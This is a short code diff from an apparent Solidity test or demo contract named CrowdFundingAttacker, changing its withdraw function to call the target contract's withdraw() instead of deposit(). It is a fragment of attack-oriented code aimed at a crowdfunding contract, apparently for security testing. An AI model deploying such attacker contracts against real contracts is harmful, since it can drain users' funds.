@@ -379,7 +379,7 @@ contract CrowdFundingAttacker{
     }
     
     function withdraw() public returns (bool){
-        if( targetAddress.call(bytes4(sha3("deposit()"))) == false ) {
+        if( targetAddress.call(bytes4(sha3("withdraw()"))) == false ) {
              revert();
         }
         return true;
